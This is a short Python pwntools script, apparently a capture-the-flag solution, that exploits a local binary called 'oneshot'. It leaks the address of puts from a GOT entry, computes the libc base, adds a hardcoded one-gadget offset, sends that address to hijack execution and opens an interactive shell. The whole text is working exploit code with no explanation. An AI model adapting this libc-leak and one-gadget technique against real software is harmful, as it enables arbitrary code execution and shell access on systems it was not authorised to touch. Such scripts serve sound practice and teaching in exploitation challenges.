from pwn import *
 
p = process('./oneshot')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
oneshot_off = 0xd6845
context.bits = 64
p.recvline()
p.sendline(str(0x600ad8))
puts_libc = p.recvline()
puts_libc = puts_libc.split('Value: ')[1]
libc_base = int(puts_libc,16)-libc.sym['puts']
oneshot = libc_base+oneshot_off
print "[+] puts_libc :"+puts_libc 
print "[+] Libc base :"+hex(libc_base)
print "[+] oneshot   :"+hex(oneshot)

p.recvline()
p.sendline(str(oneshot))
p.interactive()

